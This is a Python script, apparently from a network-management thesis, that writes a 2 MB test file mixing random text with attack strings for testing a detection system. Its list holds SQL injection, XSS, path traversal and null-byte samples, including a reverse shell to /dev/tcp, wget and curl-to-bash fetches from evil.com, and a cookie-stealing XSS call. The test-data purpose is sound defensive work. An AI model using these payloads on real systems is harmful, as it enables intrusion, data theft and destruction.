#!/usr/bin/env python3
"""
Gerador de payload fixo — TCC Gerenciamento de Rede
Gera payload.bin de 2MB com mix de conteúdo limpo e malicioso.
Distribuição:
  - 60% conteúdo limpo (texto aleatório)
  - 40% conteúdo malicioso (SQLi, XSS, RCE, PathTraversal) intercalado

Execute UMA vez antes dos testes:
    python3 gen_payload.py
"""
import os
import random
import string

SIZE = 2 * 1024 * 1024  # 2MB

MALICIOUS_PATTERNS = [
    # SQLi
    "' OR '1'='1'; DROP TABLE users; --",
    "UNION SELECT username, password FROM users--",
    "1; INSERT INTO logs VALUES ('hacked')--",
    "' AND 1=1 UNION SELECT null, table_name FROM information_schema.tables--",
    "admin'--",
    "1' ORDER BY 1--",
    # XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "<svg onload=fetch('http://evil.com/?c='+document.cookie)>",
    # RCE
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "| wget http://evil.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s",
    "`cmd /c whoami`",
    "$(curl http://evil.com/payload | bash)",
    # Path Traversal
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "../../../var/www/html/config.php",
    # Null byte
    "file.php\x00.jpg",
    "index.php%00",
]

CLEAN_CHARS = string.ascii_letters + string.digits + " .,!?-_:/\n\t"

def gen_payload(size: int) -> bytes:
    result = bytearray()
    while len(result) < size:
        if random.random() < 0.4:
            # bloco malicioso
            pattern = random.choice(MALICIOUS_PATTERNS)
            padding = random.randint(20, 200)
            clean = "".join(random.choices(CLEAN_CHARS, k=padding))
            block = f"{clean}{pattern}{clean}"
            result.extend(block.encode("utf-8", errors="replace"))
        else:
            # bloco limpo
            chunk_size = random.randint(100, 500)
            clean = "".join(random.choices(CLEAN_CHARS, k=chunk_size))
            result.extend(clean.encode("utf-8"))

    # Garante tamanho exato
    result = result[:size]
    return bytes(result)

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.bin")
print(f"⏳ Gerando payload de {SIZE//(1024*1024)}MB...")
data = gen_payload(SIZE)
with open(out, "wb") as f:
    f.write(data)

print(f"✅ payload.bin gerado: {len(data)/1024/1024:.2f} MB em {out}")
print(f"   Mix: ~40% malicioso (SQLi/XSS/RCE/PathTraversal) + ~60% limpo")
print(f"   Reutilize este arquivo em todos os testes.")